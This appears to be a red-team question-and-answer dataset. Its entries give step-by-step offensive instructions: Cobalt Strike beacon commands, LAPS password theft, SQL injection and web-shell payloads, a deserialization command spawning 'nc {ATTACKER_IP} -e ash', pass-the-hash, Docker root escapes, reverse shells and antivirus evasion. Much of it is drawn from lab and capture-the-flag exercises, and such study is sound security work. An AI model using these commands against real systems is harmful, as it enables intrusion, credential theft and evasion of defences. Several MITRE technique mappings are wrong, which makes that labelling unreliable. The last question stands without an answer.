# QA Dataset: cowWhySo/pentest-redteam-steering

## Q: How can we use 0trace to bypass stateful packet filters?
A: 0trace is a traceroute tool that can be run within an existing, open TCP connection, allowing it to bypass some types of stateful packet filters. To use 0trace, run the following command:

```
root@kali:~# 0trace.sh iface target_ip [target_port]
```

Replace 'iface' with the network interface, 'target_ip' with the target IP address, and optionally 'target_port' with the target port. This will allow you to trace the route to the target while bypassing certain firewall rules. MITRE References: MITRE ID is T1071, MITRE Name is: Application Layer Protocol, and MITRE Tactics are: Command and Control.

## Q: How can we use the usleep command from the 0trace package to implement timing-based attacks?
A: The usleep command from the 0trace package allows you to suspend execution of the calling thread for microsecond intervals. This can be useful for implementing timing-based attacks, such as timing side-channel attacks, to gather information about a target system. To use usleep, run the following command:

```
root@kali:~# usleep usec
```

Replace 'usec' with the number of microseconds to suspend execution. This can be used in scripts or tools to introduce precise timing delays for various security testing purposes. MITRE References: MITRE ID is T1497, MITRE Name is: Delay Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can Artifact and Resource Kits in Cobalt Strike be used to bypass antivirus solutions?
A: The Artifact and Resource Kits in Cobalt Strike can be used to modify the Beacon payload to bypass antivirus solutions. By customizing the artifacts and resources used by Beacon, you can change its behavioral characteristics and make it less detectable by security tools. This allows Cobalt Strike to maintain persistence on a compromised system and continue its attack operations. Cobalt Strike version 4.7. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker use LAPS to move laterally within an environment?
A: If we can find the correct GPO, we can download the LAPS configuration from the `gpcfilesyspath`.

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
         dir     03/16/2021 16:59:45   Scripts
 575b     fil     03/16/2021 17:11:46   comment.cmtx
 740b     fil     03/16/2021 17:11:46   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol (740 bytes)
[*] download of Registry.pol is complete
```

`Parse-PolFile` from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3    <-- Password contains uppers, lowers and numbers (4 would also include specials)

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14   <-- Password length is 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 7    <-- Password is changed every 7 days

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 14
ValueData   : lapsadmin   <-- The name of the local admin account to manage

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1   <-- LAPS is enabled
```

If we have the credentials for somebody in the `1st Line Support`, this could allow us to move laterally to a machine with an even higher-privileged user logged on. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: How can an attacker retrieve the LAPS password for a compromised machine?
A: Since Domain Admins can read all the LAPS password attributes, `Get-AdmPwdPassword` will do just that.

```
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : WRSZV43u16qkc1
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

This isn't particularly useful as if you already have Domain Admin privileges, you probably don't need to leverage the LAPS passwords. However, if we have the credentials for somebody in the `1st Line Support`, this could allow us to move laterally to a machine with an even higher-privileged user logged on.

bfarmer cannot read the LAPS passwords:

```
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : 
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

Make a token (or use some other method of impersonation) for a user in the `1st Line Support` group.

```
beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : P0OPwa4R64AkbJ
ExpirationTimestamp : 3/23/2021 5:18:43 PM

beacon> rev2self
beacon> make_token .\lapsadmin P0OPwa4R64AkbJ
beacon> ls \\wkstn-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
         dir     02/19/2021 14:35:19   $Recycle.Bin
         dir     02/10/2021 03:23:44   Boot
         dir     10/18/2016 01:59:39   Documents and Settings
         dir     02/23/2018 11:06:05   PerfLogs
         dir     03/16/2021 17:09:07   Program Files
         dir     03/04/2021 15:58:19   Program Files (x86)
         dir     03/16/2021 17:51:42   ProgramData
         dir     10/18/2016 02:01:27   Recovery
         dir     02/19/2021 14:45:10   System Volume Information
         dir     03/03/2021 12:17:35   Users
         dir     02/17/2021 16:16:17   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 704mb    fil     03/16/2021 17:01:51   pagefile.sys
``` MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Persistence, Privilege Escalation, Initial Access.

## Q: What are some ways to execute queries against a Microsoft SQL Server instance after gaining access?
A: There are several options for issuing queries against a SQL instance after gaining access:1. Using the `Get-SQLQuery` cmdlet from PowerUpSQL:`beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"`2. Using `mssqlclient.py` from Impacket via proxychains:`root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25`3. Using a Windows SQL GUI tool like HeidiSQL or SSMS via Proxifier. MITRE References: MITRE ID is T1166, MITRE Name is: Debug Commands, and MITRE Tactics are: Execution.

## Q: What are the benefits of using session passing to spawn different C2 payloads?
A: Session passing is a means of spawning payloads that can talk to other Cobalt Strike listeners, or even listeners of entirely different C2 frameworks. Some benefits include: 1) Leverage capabilities within a framework that Cobalt Strike doesn't have, 2) Use different C2 frameworks as backup access if the current access is lost, 3) Emulate specific TTPs. MITRE References: MITRE ID is T1102, MITRE Name is: Web Service, and MITRE Tactics are: Command and Control.

## Q: How can we identify potential vulnerabilities in the OWA Exchange service at 10.10.15.100?
A: We can use the Nmap tool to scan the OWA Exchange service at 10.10.15.100 and identify potential vulnerabilities. The command `nmap -sV -p 443 10.10.15.100` will perform a version scan on the web server running on port 443 to determine the software and version details. This information can then be used to search for known vulnerabilities associated with the identified software versions. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can we escalate privileges on the OWA Exchange service if we identify a vulnerability?
A: If we identify a vulnerability in the OWA Exchange service, we can attempt to exploit it to escalate privileges and gain administrator access. One potential approach is to look for known vulnerabilities in the software version identified during the initial Nmap scan, and attempt to use publicly available exploit code to gain a foothold on the system. For example, if the OWA Exchange service is running a version with a known privilege escalation vulnerability, we can use a tool like Metasploit to automate the exploitation process and gain elevated access. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: What steps can you take to exploit a SQL injection vulnerability and retrieve user password hashes?
A: To exploit a SQL injection vulnerability and retrieve user password hashes, you can follow these steps:
1. Use an error-based payload to prematurely terminate the SQL statement and inject an arbitrary second statement, such as 'UNION SELECT @@version--//'
2. Verify the MySQL version information returned in the application's response, confirming the ability to execute arbitrary queries.
3. Attempt to retrieve the contents of the users table by using a payload like 'UNION SELECT password FROM users--//'
4. If the application returns errors indicating you can only retrieve one column at a time, refine the payload to target a specific column, such as 'UNION SELECT password FROM users WHERE username = 'admin'--//'
5. Analyze the response to extract the hashed user passwords, which can then be cracked offline. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Credential Access, Collection.

## Q: How can we use SQL injection to execute commands on a Microsoft SQL Server database?
A: To execute commands on a Microsoft SQL Server database via SQL injection, we can enable the xp_cmdshell stored procedure, which allows running system commands. First, we need to set the show advanced options to 1, then enable xp_cmdshell and apply the changes using RECONFIGURE. With xp_cmdshell enabled, we can execute any Windows shell command through the EXECUTE statement followed by the procedure name. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: What technique can be used to write a web shell to disk on a MySQL database server?
A: On MySQL databases, we can abuse the SELECT INTO_OUTFILE statement to write files to the web server's file system. The file location must be writable by the OS user running the database software. We can use a UNION SELECT query to include PHP code and save it as a web shell file in a writable web directory. MITRE References: MITRE ID is T1569, MITRE Name is: System Services, and MITRE Tactics are: Execution.

## Q: How can sqlmap be used to obtain an interactive shell on a vulnerable web server?
A: Sqlmap can be used to obtain an interactive shell on a vulnerable web server by using the --os-shell parameter. This will upload a webshell to a writable directory on the server and provide an interactive command prompt. Due to the high latency of time-based blind SQLi, this method works better with UNION-based SQLi vulnerabilities. MITRE References: MITRE ID is T1106, MITRE Name is: ExecuteRemoteFile, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can credentials be extracted from an NTDS dump and used to gain access to the target system?
A: The NTDS.dit file contains the password hashes for all users on the domain. By using tools like libesedb and ntdsxtract, the attacker was able to extract the hashes from the NTDS dump and crack them offline. The cracked hashes were then used to authenticate as the user 'atanas' on the target system. This technique allows an attacker to obtain credentials without directly compromising the target. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can a vulnerable Wget version be exploited to escalate privileges to root?
A: The target system was running Wget version 1.16, which contained a vulnerability that allowed arbitrary code execution as root. By creating a malicious .wgetrc file on the attacker's FTP server and using authbind to run the exploit script, the attacker was able to obtain the contents of /etc/shadow and /etc/passwd, revealing the existence of a separate virtual machine or container. The attacker was then able to modify the .wgetrc file to retrieve the root flag, demonstrating how a vulnerable Wget version can be exploited for privilege escalation. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Privilege Escalation.

## Q: How can you brute force a SOCKS5 server to find valid credentials?
A: Use the following nmap script to brute force a SOCKS5 server:

`nmap --script socks-brute -p 1080 <ip>`

For more advanced usage, you can specify custom usernames and passwords:

`nmap  --script socks-brute --script-args userdb=users.txt,passdb=rockyou.txt,unpwdb.timelimit=30m -p 1080 <ip>` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you perform server-side request forgery (SSRF) to gain access to an internal web application?
A: To perform SSRF, you can try to leverage the "test.asp" file which accepts a "u" parameter to load a specified URL. By fuzzing the "127.0.0.1" address, you can discover the "cmd.aspx" file which executes commands specified in the "xcmd" parameter. This allows you to execute commands on the server-side and potentially gain access to the internal web application. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: How can you create a reverse ICMP shell to gain remote access to a Windows system?
A: You can use the Nishang "Invoke-PowerShellIcmp" script to create a reverse ICMP shell. This script allows you to execute PowerShell commands on the target system and receive the output over an ICMP channel. To use this, you'll need to host the script on the attacker machine and modify the IP address to match your setup. Then, you can execute the script on the target system to establish the reverse shell connection. MITRE References: MITRE ID is T1059.001, MITRE Name is: Command and Scripting Interpreter: PowerShell, and MITRE Tactics are: TA0002.

## Q: How can you escalate privileges on a Windows system by modifying a scheduled task?
A: On the target system, there is a scheduled task that runs the "c.ps1" script every 5 minutes. By modifying the permissions on this script to make it world-writable, you can overwrite the contents with your own PowerShell code to execute and gain a reverse shell as the "decoder" user. This allows you to escalate privileges and access the user flag. MITRE References: MITRE ID is T1053.005, MITRE Name is: Scheduled Task/Job: Scheduled Task, and MITRE Tactics are: TA0004.

## Q: How can you extract sensitive information from a password-protected ZIP file on the target system?
A: On the "decoder" user's desktop, there is a "backup.zip" file that contains a hidden "pass" stream with an NTLM hash. By using PowerShell commands to read the alternate data streams and extracting the ZIP file, you can obtain the NTLM hash. This hash can then be cracked online to reveal the plaintext password "1234test", which can be used to access the administrator's share and escalate privileges further. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: TA0009.

## Q: How can you perform deserialization attacks against Java RMI services?
A: You can perform deserialization attacks against Java RMI services using remote-method-guesser. For example, you can run the command: "rmg serial {IP} {PORT} CommonsCollections6 'nc {ATTACKER_IP} {ATTACKER_PORT} -e ash' --bound-name {BOUND_NAME} --signature {METHOD_SIGNATURE}" to execute a deserialization attack. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004.

## Q: How can you bypass a login form that is vulnerable to SQL injection?
A: To bypass a login form that is vulnerable to SQL injection, you can comment out the rest of the statement using the username 'admin'-- -. This will bypass the login form and allow you to access the application. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you perform command injection on a welcome.php page?
A: To perform command injection on a welcome.php page, you can use a semicolon to add additional commands. However, script execution may be stopped after the traceroute is run. By intercepting the response in Burp Suite, you can modify the command entirely. Replace the traceroute command with the desired command and send the request, making sure to URL encode the command. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: What are the steps to perform overpass-the-hash using both an NTLM hash and AES keys?
A: To perform overpass-the-hash using an NTLM hash and AES keys, follow these steps:1. Request a TGT (Ticket-Granting Ticket) for the user you want to impersonate using the NTLM hash:```beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap```2. Request a TGT using the AES256 key instead of the NTLM hash:```beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec```3. Create a new logon session to avoid clobbering the existing TGT:```beacon> make_token DEV\jking DummyPass```4. Use the `kerberos_ticket_use` command to pass the TGT obtained in step 2 into the new logon session.5. Search for event 4768 (Kerberos authentication ticket (TGT) was requested) with a TicketEncryptionType of 0x17 (RC4-HMAC) to find the RC4 ticket in your Kibana logs. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, TA0004.

## Q: What are some techniques to find publicly available documents associated with a target organization and analyze their metadata to gather information about the target's software?
A: To find publicly available documents associated with a target organization and analyze their metadata, you can:1. Use search engines like Google to find PDF files on the target's website using the 'site:example.com filetype:pdf' query. This can reveal information about the software used to create the documents.2. Use tools like gobuster with the -x parameter to search the target's website for specific file extensions, which may uncover additional documents.3. Analyze the metadata of the downloaded documents using tools like exiftool. This can reveal details such as the file creation/modification dates, author names, software used to create the documents, and operating system information.Analyzing this metadata can help build an accurate profile of the software installed on the target organization's systems, which can inform potential client-side attack vectors. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: Discovery.

## Q: What is a 'pretext' in the context of social engineering and how can it be used to get a target to click on a malicious link?
A: A 'pretext' is a story or context that is used to frame a situation in a specific way and justify an attacker's request or action. In the case of getting a target to click on a malicious link, a pretext can be used to create a plausible reason for the target to click the link, such as claiming there is an error in an invoice that needs to be reviewed. The pretext should leverage the target's job role or other contextual information to make the request seem legitimate and benign. MITRE References: MITRE ID is T1559, MITRE Name is: Interprocess Communication, and MITRE Tactics are: Execution.

## Q: How can a macro in a Microsoft Word document be used to launch a reverse shell?
A: A macro in a Microsoft Word document can be used to launch a reverse shell by leveraging ActiveX objects to instantiate a Windows Script Host Shell object and invoke the Run method to execute a PowerShell command. The PowerShell command can download and execute a reverse shell payload like PowerCat. To ensure the macro can be executed, the AutoOpen macro and Document_Open event are used to call the custom procedure when the Word document is opened. MITRE References: MITRE ID is T1204.002, MITRE Name is: User Execution: Malicious File, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can you bypass user agent filtering on a web application to reveal hidden directories?
A: To bypass user agent filtering on a web application and reveal hidden directories:1. Use a tool like Burp Suite or OWASP ZAP to intercept and modify the request headers.2. Change the 'User-Agent' header to spoof a different browser, e.g. 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'.3. Send the modified request and check the response for any new directories or endpoints that were previously hidden. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Lateral Movement.

## Q: How can you enumerate a Sharepoint server to find sensitive information?
A: By browsing to the _layouts/viewlsts.aspx page, you can often find exposed documents or credentials. The Sharepoint site may also have issues causing incorrect links to be displayed, which can be fixed by manually adjusting the URL or viewing the site in mobile mode. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: Windows Admin Shares, and MITRE Tactics are: TA0006, TA0009.

## Q: How can you exploit a vulnerable version of MSSQL to gain remote code execution?
A: After enumerating the target and finding MSSQL credentials, you can connect with a tool like sqsh and enable the xp_cmdshell functionality to execute arbitrary commands. Be aware that Windows Defender may detect payloads, so a more stealthy approach like a Meterpreter injection may be required. MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: TA0004, TA0008.

## Q: How can you escalate privileges on a Windows system by exploiting a vulnerable version of Firefox?
A: By creating a malicious HTML file and serving it to a simulated user browsing to a specific folder, you can exploit a vulnerability in the target's Firefox installation to gain elevated privileges. The shellcode may need to be slightly modified to bypass security controls. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005, TA0011.

## Q: How can you manually compile and modify a Windows privilege escalation exploit to bypass security controls?
A: After identifying a suitable exploit, you may need to make minor modifications to the source code, such as adjusting the target filename and including additional libraries. Compiling the exploit with the appropriate flags in a tool like Visual Studio or CL can allow it to bypass security controls like Windows Defender. You'll also need to create a separate executable that the exploit will trigger to execute your payload. MITRE References: MITRE ID is T1486, MITRE Name is: Data Encrypted for Impact, and MITRE Tactics are: TA0004, TA0005.

## Q: How can you bypass Windows Defender to execute a malicious payload on a target system?
A: To bypass Windows Defender and execute a malicious payload, you can try the following techniques:

1. Use fileless execution methods, such as running the payload directly in memory without touching the disk.
2. Leverage trusted, signed executables to execute your payload (e.g. using a pass-the-hash attack).
3. Obfuscate or encrypt your payload to avoid detection by antivirus scanners.
4. Exploit vulnerabilities in Windows Defender or other security software to disable or bypass the protection. MITRE References: MITRE ID is T1562.001, MITRE Name is: Disable or Modify Tools, and MITRE Tactics are: Defense Evasion.

## Q: How can you perform a pass-the-hash attack to gain administrative access on a Windows system?
A: To perform a pass-the-hash attack, you can use the following steps:

1. Obtain the NTLM hash of a user with administrative privileges, for example by extracting it from a KeePass database.
2. Use a tool like 'pth-winexe' to execute a command on the target system using the stolen NTLM hash instead of the user's password.
3. The command 'pth-winexe -U <DOMAIN>/<USERNAME>%<HASH> //<TARGET_IP> cmd' will spawn a shell with the privileges of the user whose hash you have. MITRE References: MITRE ID is T1550.002, MITRE Name is: Pass the Hash, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can SSH port forwarding/tunneling be used to bypass a web application firewall (WAF)?
A: SSH port forwarding can be used to bypass a WAF by creating a tunnel through the restricted network. This is done by opening an SSH connection to a host on the other side of the WAF, and then forwarding local ports through the SSH tunnel to access resources on the remote network that would otherwise be blocked by the WAF. For example, the command `ssh -i bastion.key 10.10.10.65 -p 1022 -L <LOCALPORT>:172.24.0.2:80` can be used to forward a local port to the web server on the other side of the WAF. MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: Command and Control.

## Q: How can the Docker group be used for privilege escalation?
A: If a user is a member of the Docker group, they can potentially escalate privileges by spawning a Docker container with the root filesystem mounted. This allows them to access the underlying host operating system with root privileges. The command `docker run -it -v /:/opt bash bash` can be used to create a container with the root filesystem mounted, allowing the attacker to access the host system as root. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: How can PowerShell be used to bypass outbound network restrictions and obtain a shell on a remote host?
A: To bypass outbound network restrictions and obtain a remote shell using PowerShell:
1. Use PowerShell to create a TCP connection to the attacker's machine on a permitted port, such as port 53 for DNS traffic.
2. Execute a PowerShell reverse shell one-liner that will execute commands on the remote host and send the output back through the TCP connection.
3. On the attacker's machine, listen on the specified port to receive the reverse shell connection and execute commands on the remote host. MITRE References: MITRE ID is T1086, MITRE Name is: PowerShell, and MITRE Tactics are: Execution, Lateral Movement.

## Q: What technique can be used to obtain files from a web server using a local file inclusion vulnerability in dompdf?
A: A local file inclusion (LFI) vulnerability in dompdf version 0.6.0 can be exploited to read files from the web server. By using php://filter, it is possible to base64-encode a file on the target and add its contents to the generated PDF file. This technique can be used to obtain sensitive configuration files like /etc/apache2/sites-enabled/000-default.conf. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can you use WebDAV to gain remote code execution on a system?
A: By obtaining valid WebDAV credentials, it is possible to upload a PHP script to the WebDAV directory and execute it to gain remote code execution. This can be achieved using various methods, such as cURL, to upload the malicious file to the WebDAV-enabled directory. MITRE References: MITRE ID is T1189, MITRE Name is: Weaken Encryption, and MITRE Tactics are: Initial Access.

## Q: How can the /sync endpoint be fuzed to find a vulnerable parameter?
A: Using the wordlist at https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameternames.txt, the parameter 'opt' can be found as the only result with a 403 error when fuzzing with wfuzz: wfuzz -c -z file,burp-parameter-names.txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can the use of syscalls be integrated into Cobalt Strike's Artifact Kit to bypass detection of Beacon payloads?
A: The use of syscalls can be integrated into Cobalt Strike's Artifact Kit to bypass detection of Beacon payloads. The default EXE payload uses Win32 APIs like VirtualAlloc, VirtualProtect, and CreateThread to execute Beacon shellcode. To avoid detection, you can replace these Win32 APIs with their NT equivalent syscalls using a tool like InlineWhispers2. This involves copying the generated syscalls.c, syscalls.h, and syscalls-asm.h files into the artifact kit directory, including syscalls.c in the patch.c file, and replacing the Win32 API calls with their Nt equivalent. This can help bypass detection by avoiding the use of common APIs. MITRE References: MITRE ID is T1620, MITRE Name is: Reflective Code Injection, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How can we extract Kerberos ticket-granting tickets (TGTs) directly from memory if a user is logged onto a machine we control?
A: To extract Kerberos TGTs directly from memory, we can use the Rubeus tool (version 2.0.7). The key steps are:
1. Use Rubeus "triage" to list the Kerberos tickets in all the logon sessions currently on the system (if not elevated, it can only show tickets in your own logon session).
2. Identify the LUID (Logon ID) of the target user's TGT.
3. Use Rubeus "dump" with the /service:krbtgt and /luid:[LUID] flags to extract the TGT from memory.
4. Create a sacrificial logon session with Rubeus "createnetonly" and note the new LUID and ProcessID.
5. Use Rubeus "ptt" with the /luid:[LUID] and /ticket:[base64-ticket] flags to pass the extracted TGT into the sacrificial logon session.
6. Steal the access token of the sacrificial process and use it to access target resources. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: What are some common techniques used to obfuscate on-disk malware?
A: Common techniques for obfuscating on-disk malware include the use of packers, obfuscators, and crypters. Packers reduce the size of an executable while generating a new binary structure. Obfuscators reorganize and mutate code to make it more difficult to reverse-engineer. Crypters cryptographically alter executable code, adding a decryption stub that restores the original code upon execution. These techniques can be used in combination to bypass signature-based antivirus detection. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: What are some advanced techniques used to evade antivirus detection?
A: Advanced antivirus evasion techniques include anti-reversing, anti-debugging, virtual machine emulation detection, and the use of software protectors. These techniques aim to hinder analysis and detection by making the malware harder to understand and interact with. While many of these techniques were originally designed for legitimate software protection, they can also be leveraged by malware authors to bypass security controls. MITRE References: MITRE ID is T1221, MITRE Name is: Software Protections, and MITRE Tactics are: Defense Evasion.

## Q: What are some techniques that can be used to bypass antivirus detection when executing malicious code?
A: One technique to bypass antivirus detection is to use in-memory process injection. This involves allocating memory in the current process, writing malicious code to the allocated memory, and executing it directly in memory without touching the file system. This can be done using PowerShell and the Windows API functions VirtualAlloc, memset, and CreateThread. Modifying variable names and other code obfuscation can also help bypass signature-based detection of the script. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can PowerShell be used to execute malicious code while evading antivirus detection?
A: PowerShell can be used to execute malicious code in memory without touching the file system, which can help evade antivirus detection. This is done by using Windows API functions like VirtualAlloc, memset, and CreateThread to allocate memory, write shellcode to it, and execute it directly in the current PowerShell process. Obfuscating the script by renaming variables can also bypass signature-based detection. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Defense Evasion.

## Q: What are some common techniques used to bypass antivirus detection on Windows?
A: Some common techniques used to bypass antivirus detection on Windows include:1. In-Memory Injections (T1055 Process Injection, T1218 System Binary Proxy Execution): Injecting malicious code directly into memory without writing files to disk.2. Reflective DLL Injection (T1055 Process Injection): Loading a malicious DLL from memory instead of from disk.3. Process Hollowing (T1093 Process Hollowing): Replacing a legitimate process' image in memory with a malicious one.4. Inline Hooking (T1179 Hooking): Modifying memory to redirect code execution to malicious functionality. MITRE References: MITRE ID is T1055, T1218, T1093, T1179, MITRE Name is: Process Injection, System Binary Proxy Execution, Process Hollowing, Hooking, and MITRE Tactics are: Defense Evasion.

## Q: How can the Meterpreter payload be used with Shellter to bypass antivirus detection?
A: When using Shellter, the Meterpreter payload can be selected to bypass antivirus detection. Shellter will inject the Meterpreter payload into the target executable and attempt to restore the execution flow using Stealth Mode, which helps the modified executable appear normal. This allows the Meterpreter payload to be executed on the target system without being detected by the antivirus software. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can a ZIP archive be used to achieve remote code execution on a vulnerable web application?
A: By using the PHP zip:// wrapper, it is possible to include a PHP file from within a ZIP archive. The URL `?op=zip://uploads/<IP>/<HASH>#writeup.php?cmd=id` can be used to include the `writeup.php` file from a ZIP archive located in the `uploads` directory. This technique can be used to achieve remote code execution by including a malicious PHP script within the ZIP archive and triggering its execution. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can the SSH brute-force attack be carried out on the Nightmare machine?
A: The SSH brute-force attack can be carried out using a tool like Hydra. The syntax for the Hydra command would be: hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4. This command uses the provided username and password lists to attempt to brute-force the SSH service running on the non-standard port 2222. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can the SFTP shell exploitation be performed on the Nightmare machine?
A: The SFTP shell exploitation can be performed using the exploit available at https://github.com/SECFORCE/sftp-exploit. Since the machine has outbound firewall rules, the attacking machine must be listening on port 443. A Python one-liner or any other reverse shell method that does not require write access can be used to obtain the shell. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Lateral Movement, Execution.

## Q: How can the "Decoder - Guid Binary" privilege escalation be performed on the Nightmare machine?
A: The "Decoder - Guid Binary" privilege escalation can be performed by first using curl to pipe LinEnum to bash, as the ftpuser does not have write access. LinEnum will identify a GUID file for the Decoder user at /usr/bin/sls, which can be exfiltrated through Base64 encode/decode or netcat. The binary can then be reverse-engineered using tools like Radare2, as demonstrated in the IppSec's Nightmare video. By passing the -b flag, the sls binary does not filter newline characters, and entering "sls -b "$(printf '
/bin/sh')"" will execute a shell as part of the decoder group. MITRE References: MITRE ID is T1057, MITRE Name is: Process Discovery, and MITRE Tactics are: Privilege Escalation, Discovery.

## Q: How can the root privilege escalation be achieved on the Nightmare machine?
A: The root privilege escalation can be achieved by exploiting CVE-2017-1000112. Since gcc is not available on the target machine, the exploit must be compiled locally and then dropped on the target system. LinEnum previously identified /home/decoder/test as world-writable, which can be used to drop the binary. The exploit requires the /etc/lsb-release file, which is not present on the target. This can be fixed by changing the references in the exploit to /home/decoder/test/lsb-release. Running the modified exploit binary will immediately grant a root shell. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can a permissive tmux session running as root be leveraged to gain privileged access on a system?
